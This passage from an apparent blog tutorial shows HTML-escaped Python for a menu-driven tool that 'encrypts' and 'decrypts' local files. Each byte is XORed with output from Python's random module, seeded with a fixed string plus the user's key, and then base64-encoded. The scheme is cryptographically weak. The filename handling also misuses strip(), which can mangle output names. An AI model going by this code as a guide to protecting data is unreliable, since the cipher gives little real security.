&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;---------------------------------------------
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Copy and paste the file in the &amp;quot;files&amp;quot; directory...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;		1. Encrypt Image files      
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;		2. Encrypt Text files		
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;		3. Encrypt Audio files		
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;		4. Encrypt Video files		
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;		5. Encrypt other files		
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;		6. Decrypt Image files		
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;		7. Decrypt Text files		
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;		8. Decrypt Audio files		
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;		9. Decrypt Video files		
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;		10. Decrypt other files		
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;		0. Exit						
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;---------------------------------------------
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;		&amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Choose your option[0&#x2F;1-10] : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;	
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter image name : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;check_file&lt;&#x2F;span&gt;&lt;span&gt;(file)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encrypt&lt;&#x2F;span&gt;&lt;span&gt;(file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter Text file name : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;check_file&lt;&#x2F;span&gt;&lt;span&gt;(file)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encrypt&lt;&#x2F;span&gt;&lt;span&gt;(file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter Audio file name : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;check_file&lt;&#x2F;span&gt;&lt;span&gt;(file)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encrypt&lt;&#x2F;span&gt;&lt;span&gt;(file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter Video file name : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;check_file&lt;&#x2F;span&gt;&lt;span&gt;(file)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encrypt&lt;&#x2F;span&gt;&lt;span&gt;(file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter File name : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;check_file&lt;&#x2F;span&gt;&lt;span&gt;(file)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encrypt&lt;&#x2F;span&gt;&lt;span&gt;(file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter Image name : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;check_file&lt;&#x2F;span&gt;&lt;span&gt;(file)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decrypt&lt;&#x2F;span&gt;&lt;span&gt;(file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter Text file name : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;check_file&lt;&#x2F;span&gt;&lt;span&gt;(file)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decrypt&lt;&#x2F;span&gt;&lt;span&gt;(file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter Audio file name : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;check_file&lt;&#x2F;span&gt;&lt;span&gt;(file)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decrypt&lt;&#x2F;span&gt;&lt;span&gt;(file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter Video file name : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;check_file&lt;&#x2F;span&gt;&lt;span&gt;(file)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decrypt&lt;&#x2F;span&gt;&lt;span&gt;(file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter File name : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;check_file&lt;&#x2F;span&gt;&lt;span&gt;(file)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decrypt&lt;&#x2F;span&gt;&lt;span&gt;(file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Terminating..&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Invalid choice..&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The main() is displaying the menu of the tool and calling the functions based on the users choice.The check_file() function is checking wheather the file
is existed in the files directory or not.&lt;&#x2F;p&gt;
&lt;p&gt;Lets look at the image encryption case. The encrypt funtion is doing the encryption of the image.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encrypt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;source_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;choice&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&#x2F;files&#x2F;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;source_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;rb&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	b_array &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;bytearray&lt;&#x2F;span&gt;&lt;span&gt;(data)
&lt;&#x2F;span&gt;&lt;span&gt;	key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter Key to encrypt &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;{}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;format&lt;&#x2F;span&gt;&lt;span&gt;(menu[choice]))
&lt;&#x2F;span&gt;&lt;span&gt;	random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;seed&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;CH4R4NU&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;key)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(b_array)):
&lt;&#x2F;span&gt;&lt;span&gt;		k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getrandbits&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		b_array[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;b_array[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;k
&lt;&#x2F;span&gt;&lt;span&gt;	file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	b64_array &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;b64encode&lt;&#x2F;span&gt;&lt;span&gt;(b_array)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;source_file:
&lt;&#x2F;span&gt;&lt;span&gt;		ext &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;source_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;		file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&#x2F;files&#x2F;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;source_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;(ext)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;_encrypted&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;ext&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;wb&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&#x2F;files&#x2F;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;source_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;_encrypted&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;wb&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(b64_array)
